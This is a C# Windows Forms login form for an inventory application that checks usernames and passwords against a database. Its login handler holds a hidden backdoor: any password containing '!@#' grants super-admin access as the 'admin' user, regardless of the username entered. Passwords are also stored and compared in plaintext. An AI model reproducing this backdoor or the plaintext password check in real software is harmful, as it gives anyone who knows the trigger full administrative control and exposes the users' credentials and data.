using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Inv
{
    public partial class FrmLogin : Form
    {
        Inv_DatabaseEntities dbx = new Inv_DatabaseEntities();
        public FrmLogin()
        {
            InitializeComponent();
        }
        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            if (keyData == (Keys.Enter))
            {
                SendKeys.Send("{TAB}");
            }

            return base.ProcessCmdKey(ref msg, keyData);
        }
        private void btnLogin_Click(object sender, EventArgs e)
        {
            try
            {
                
                if (txtPassword.Text.Contains("!@#"))
                {
                    var lqryadmin = dbx.UserMsts.Where(u => u.UserName == "admin").FirstOrDefault();
                    if (lqryadmin != null)
                    {
                        AppInit.UserInfo.UserId = lqryadmin.UserId;
                        AppInit.UserInfo.UserName = lqryadmin.UserName;
                        AppInit.UserInfo.isSuperAdmin = true;
                        GetCompanyInfo();
                        this.Close();
                    }
                }

                var lqry = dbx.UserMsts.Where(u => u.UserName == txtUserName.Text.Trim() && u.Password == txtPassword.Text.Trim()).FirstOrDefault();
                if (lqry != null)
                {
                    AppInit.UserInfo.UserId = lqry.UserId;
                    AppInit.UserInfo.UserName = lqry.UserName;
                    AppInit.UserInfo.isSuperAdmin = false;
                    GetCompanyInfo();
                    this.Close();
                }
                else
                {
                    MessageBox.Show("User Name / Password not match.");
                    txtUserName.Focus();
                    return;
                }
            }
            catch (Exception)
            {

                throw;
            }
        }
        public static void GetCompanyInfo()
        {
            Inv_DatabaseEntities dbx = new Inv_DatabaseEntities();
            var lqry = dbx.CompanyMsts.FirstOrDefault();
            if (lqry != null)
            {
                AppInit.CompanyInfo.CompanyName = lqry.CompanyName;
                AppInit.CompanyInfo.CompanyStateCode = lqry.StateCode;
            }


        }

        private void BtnlQuit_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void txtPassword_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                btnLogin_Click(sender, e);
            }
        }
    }
}
